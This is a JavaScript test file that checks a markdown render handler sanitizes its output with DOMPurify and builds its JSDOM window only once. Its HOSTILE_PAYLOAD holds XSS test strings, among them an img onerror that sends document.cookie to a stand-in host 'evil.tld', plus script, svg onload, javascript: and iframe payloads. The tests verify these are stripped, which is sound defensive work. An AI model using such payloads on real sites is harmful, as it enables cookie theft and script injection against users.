'use strict';
/**
 * Contract: standalone `markdown.api.render` registration + sanitization.
 *
 * The standalone host has no VS Code, so the built-in `markdown.api.render`
 * command is unbridged and every preview pane (kanban plan, constitution, PRD,
 * archived plan detail, insight, design live preview) goes blank — the headless
 * command seam is registry-first and falls through to vscodeShim's
 * warn-and-return-undefined. bootstrap.ts must register a handler that renders
 * markdown via `marked` and sanitizes via `DOMPurify`.
 *
 * Two failure classes this contract pins:
 *
 *   1. SECURITY REGRESSION. `marked` v16 does not sanitize (the `sanitize`
 *      option was removed in v0.8). Every consumer assigns the result to
 *      innerHTML, and the panel CSP carries `script-src-attr 'unsafe-inline'`
 *      with no nonce, so inline event handlers (`<img src=x onerror=...>`)
 *      execute. The 5 currently-working ticket/live-preview paths would move
 *      from escape-everything (hand-rolled renderMarkdown) to
 *      pass-everything-through without DOMPurify. The handler MUST wrap
 *      marked(...) in DOMPurify.sanitize.
 *
 *   2. PERF CLIFF. Building a JSDOM window per render is ~100x slower. The
 *      window MUST be built at most once and reused — no test catches a
 *      per-call window otherwise. It is built lazily behind a module-scope
 *      memo rather than at module scope, because requiring bootstrap.ts is on
 *      the `npx switchboard` start path and jsdom init costs ~0.5s.
 *
 * The behavioral assertions run the EXACT pipeline the handler uses
 * (createDOMPurify(new JSDOM('').window).sanitize(marked(content)))
 * against a hostile payload, so they validate the sanitization contract for real
 * without booting the full standalone host (which starts an HTTP server, PTY
 * fleet, watchers, etc. and is impractical in a unit test).
 */
const assert = require('assert');
const fs = require('fs');
const path = require('path');

const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');

// `marked` v16 is ESM-only. `require()` of an ESM module only works on Node
// >=20.19 / >=22.12; this repo's engines allow 22.0 and CI pins `node-version: 20`,
// so a top-level require() here is a version-dependent crash. Load it the same
// way bootstrap.ts does — dynamic import — which works on every supported Node.
let marked;

const REPO_ROOT = path.resolve(__dirname, '..', '..');
const BOOTSTRAP_PATH = path.join(REPO_ROOT, 'src', 'standalone', 'bootstrap.ts');
const bootstrapSource = fs.readFileSync(BOOTSTRAP_PATH, 'utf8');

// The four panels whose preview panes consume markdown.api.render output.
// headlessPanelHtml.ts serves these same files to the browser host, so one rule
// covers both hosts.
const PANEL_HTML = ['project', 'planning', 'tickets', 'design'];

let passed = 0;
let failed = 0;

function test(name, fn) {
    try {
        fn();
        console.log(`  PASS ${name}`);
        passed++;
    } catch (error) {
        console.error(`  FAIL ${name}: ${error.message}`);
        failed++;
    }
}

/** Extract the body of a switchboardCommandRegistry.register('id', ...) handler. */
function extractRegisterHandlerBody(source, commandId) {
    const idRe = new RegExp(`switchboardCommandRegistry\\.register\\(\\s*['"]${commandId.replace(/\./g, '\\.')}['"]\\s*,`);
    const match = idRe.exec(source);
    if (!match) { throw new Error(`register('${commandId}', ...) not found`); }
    // Walk to the opening '(' of register(, then balance parens to find the
    // second argument (the handler), then balance braces to find its body.
    let i = match.index + match[0].length;
    // We are just past the matched text which ends with the comma after the id.
    // Skip whitespace to the handler's start (arrow fn or function).
    while (i < source.length && /\s/.test(source[i])) { i++; }
    // Find the handler body braces.
    while (i < source.length && source[i] !== '{') { i++; }
    const bodyStart = i;
    let depth = 0;
    for (let j = bodyStart; j < source.length; j++) {
        if (source[j] === '{') depth++;
        if (source[j] === '}') {
            depth--;
            if (depth === 0) { return source.slice(bodyStart, j + 1); }
        }
    }
    throw new Error(`register('${commandId}', ...) handler body not found`);
}

// The exact pipeline the bootstrap handler uses. One window, reused.
// `marked` is bound at the top of run(), before any renderPipeline call.
const purifier = createDOMPurify(new JSDOM('').window);
function renderPipeline(content) {
    // Same call shape as the handler: marked(...) — `marked.parse === marked`.
    return purifier.sanitize(marked(content || ''));
}

const HOSTILE_PAYLOAD = [
    '# Ticket',
    '',
    '<img src=x onerror="fetch(\'https://evil.tld/?c=\'+document.cookie)">',
    '',
    '<svg onload="alert(1)"></svg>',
    '',
    '<script>alert(2)</script>',
    '',
    '[click](javascript:alert(3))',
    '',
    '<iframe src="data:text/html,<script>alert(4)</script>"></iframe>',
    '',
    '| a | b |',
    '| :-- | --: |',
    '| 1 | 2 |',
    '',
    '```ts',
    'const x: number = 1;',
    '```',
    '',
    '**bold** and _italic_',
    '',
    '- item one',
    '- item two',
    '',
    '[link](https://example.com)',
].join('\n');

async function run() {
    ({ marked } = await import('marked'));

    console.log('\n-- standalone markdown.api.render contract --\n');

    // --- Wiring (source-text) ---

    test('bootstrap.ts loads marked via a dynamic import, never a static one', () => {
        // `marked` v16 is ESM-only ("type": "module", exports maps only to
        // marked.esm.js). bootstrap.ts compiles to CommonJS under module:Node16,
        // where a static `import { marked } from 'marked'` is a hard TS1479
        // compile error. It must be loaded with `await import('marked')`.
        assert.ok(!/import\s*\{[^}]*\bmarked\b[^}]*\}\s*from\s*['"]marked['"]/.test(bootstrapSource),
            "bootstrap.ts must NOT statically `import { marked } from 'marked'` — ESM-only dep, CommonJS file (TS1479)");
        assert.match(bootstrapSource, /await\s+import\((?:\s*\/\*[^*]*\*\/\s*)?['"]marked['"]\)/,
            "bootstrap.ts must `await import('marked')`");
    });

    test('the marked dynamic import is eager (no async chunk in the bundle)', () => {
        // Without the magic comment webpack emits a separate async chunk into
        // dist/standalone/, which the VSIX/npm payload does not expect.
        assert.match(bootstrapSource, /import\(\s*\/\*\s*webpackMode:\s*"eager"\s*\*\/\s*['"]marked['"]\)/,
            'the marked import must carry /* webpackMode: "eager" */');
    });

    test('bootstrap.ts imports JSDOM from jsdom', () => {
        assert.match(bootstrapSource, /import\s*\{\s*JSDOM\s*\}\s*from\s*['"]jsdom['"];/,
            "bootstrap.ts must `import { JSDOM } from 'jsdom';`");
    });

    test('bootstrap.ts imports createDOMPurify from dompurify', () => {
        // dompurify's bundled types use `export =`, and the project's tsconfig is
        // CommonJS with no esModuleInterop — so the import must be the
        // `import X = require(...)` form (same convention as `import JSZip =
        // require('jszip')` in ContextBundler.ts), NOT a default import.
        assert.match(bootstrapSource, /import\s+createDOMPurify\s*=\s*require\(\s*['"]dompurify['"]\s*\)\s*;/,
            "bootstrap.ts must `import createDOMPurify = require('dompurify');` (export = module, no esModuleInterop)");
    });

    test('the purifier window is built at most once, behind a module-scope memo', () => {
        // Exactly one `new JSDOM(` in the whole file: a second one is either a
        // per-call window (the perf cliff) or a second module-scope window.
        const windows = bootstrapSource.match(/new\s+JSDOM\(/g) || [];
        assert.strictEqual(windows.length, 1,
            `bootstrap.ts must construct exactly one JSDOM window, found ${windows.length}`);
        // ...and it must sit behind a memo, so requiring bootstrap.ts does not
        // pay jsdom's ~0.5s init on every `npx switchboard` start.
        assert.match(bootstrapSource, /let\s+_markdownPurifier\s*:/,
            'the purifier must be held in a module-scope memo variable');
        assert.match(bootstrapSource, /_markdownPurifier\s*\?\?=\s*createDOMPurify\(\s*new\s+JSDOM\(/,
            'the purifier must be lazily built once via `_markdownPurifier ??= createDOMPurify(new JSDOM(...))`');
    });

    test('markdown.api.render is registered', () => {
        assert.match(bootstrapSource, /switchboardCommandRegistry\.register\(\s*['"]markdown\.api\.render['"]/,
            "bootstrap.ts must register 'markdown.api.render'");
    });

    test('handler renders via marked and sanitizes via the memoized purifier', () => {
        const body = extractRegisterHandlerBody(bootstrapSource, 'markdown.api.render');
        assert.match(body, /marked\(/, 'handler must call marked(...) to render');
        assert.match(body, /getMarkdownPurifier\(\)\.sanitize\(/, 'handler must call getMarkdownPurifier().sanitize');
        // Sanitize must wrap the marked output (sanitize appears and marked(...)
        // is its argument), not run independently.
        assert.match(body, /getMarkdownPurifier\(\)\.sanitize\(\s*marked\(/,
            'DOMPurify.sanitize must wrap marked(...) output');
    });

    test('handler does not construct a JSDOM window per call (perf cliff)', () => {
        const body = extractRegisterHandlerBody(bootstrapSource, 'markdown.api.render');
        assert.ok(!/new\s+JSDOM\(/.test(body),
            'handler body must NOT construct `new JSDOM(...)` — the window is built once at module scope');
    });

    test('handler wraps rendering in try/catch returning empty string on failure', () => {
        const body = extractRegisterHandlerBody(bootstrapSource, 'markdown.api.render');
        assert.match(body, /try\s*\{/, 'handler must have a try block');
        assert.match(body, /catch\s*\{[\s\S]*return\s*['"]['"]\s*;?\s*\}/,
            'handler catch must return "" (never throw — vscodeShim never throws)');
    });

    // --- Behavioral: sanitization contract (the real pipeline) ---

    const rendered = renderPipeline(HOSTILE_PAYLOAD);

    test('hostile payload: no onerror event handler survives', () => {
        assert.ok(!/onerror/i.test(rendered), `onerror leaked: ${rendered}`);
    });
    test('hostile payload: no onload event handler survives', () => {
        assert.ok(!/onload/i.test(rendered), `onload leaked: ${rendered}`);
    });
    test('hostile payload: no javascript: URL survives', () => {
        assert.ok(!/javascript:/i.test(rendered), `javascript: leaked: ${rendered}`);
    });
    test('hostile payload: no <script tag survives', () => {
        assert.ok(!/<script/i.test(rendered), `<script leaked: ${rendered}`);
    });
    test('hostile payload: no <iframe tag survives', () => {
        assert.ok(!/<iframe/i.test(rendered), `<iframe leaked: ${rendered}`);
    });

    // Paired positives: sanitization must not gut the renderer.
    test('GFM <h1> survives sanitization', () => {
        assert.ok(/<h1[^>]*>Ticket<\/h1>/i.test(rendered), `h1 lost: ${rendered}`);
    });
    test('GFM <table> survives sanitization', () => {
        assert.ok(/<table/i.test(rendered), `table lost: ${rendered}`);
    });
    test('fenced <code> survives sanitization', () => {
        assert.ok(/<code/i.test(rendered), `code lost: ${rendered}`);
    });
    test('list <li> survives sanitization', () => {
        assert.ok(/<li/i.test(rendered), `li lost: ${rendered}`);
    });
    test('<strong> survives sanitization', () => {
        assert.ok(/<strong/i.test(rendered), `strong lost: ${rendered}`);
    });
    test('safe https:// link survives sanitization', () => {
        assert.ok(/href="https:\/\/example\.com"/i.test(rendered), `safe link lost: ${rendered}`);
    });

    // --- Renderer-swap fallout: table scroll containment ---
    //
    // `.table-wrapper` is emitted ONLY by the hand-rolled renderMarkdown
    // (sharedUtils.js:99). Registering markdown.api.render swaps the standalone
    // ticket/live-preview paths onto `marked`, which emits a bare <table> — and
    // VS Code's renderer always did too. So the `.table-wrapper { overflow-x:
    // auto }` rule never applied to real markdown output in either host, and a
    // wide table blew the preview pane out horizontally instead of scrolling.
    // The overflow now lives on the table itself. Nothing else catches this:
    // the sanitizer test passes, the panel renders, it just overflows.
    for (const panel of PANEL_HTML) {
        test(`${panel}.html: preview tables scroll instead of overflowing the pane`, () => {
            const source = fs.readFileSync(path.join(REPO_ROOT, 'src', 'webview', `${panel}.html`), 'utf8');
            const at = source.indexOf('border-collapse: collapse;');
            assert.ok(at > 0, `${panel}.html: no preview table rule found`);
            const end = source.indexOf('}', at);
            assert.ok(end > at, `${panel}.html: preview table rule is unterminated`);
            const body = source.slice(at, end);
            for (const decl of ['display: block;', 'max-width: 100%;', 'overflow-x: auto;']) {
                assert.ok(body.includes(decl),
                    `${panel}.html: preview table rule is missing \`${decl}\` — a wide GFM table will overflow the pane`);
            }
        });
    }

    // --- Goal invariants ---

    test('goal invariant: # Hello renders an <h1>', () => {
        const out = renderPipeline('# Hello');
        assert.ok(/<h1[^>]*>Hello<\/h1>/i.test(out), `# Hello did not render h1: ${out}`);
    });

    test('goal invariant: empty/undefined input returns a string (no throw)', () => {
        assert.strictEqual(typeof renderPipeline(undefined), 'string');
        assert.strictEqual(typeof renderPipeline(''), 'string');
    });

    console.log(`\nResults: ${passed} passed, ${failed} failed\n`);
    if (failed > 0) {
        process.exit(1);
    }
}

run().catch((err) => {
    console.error(err);
    process.exit(1);
});
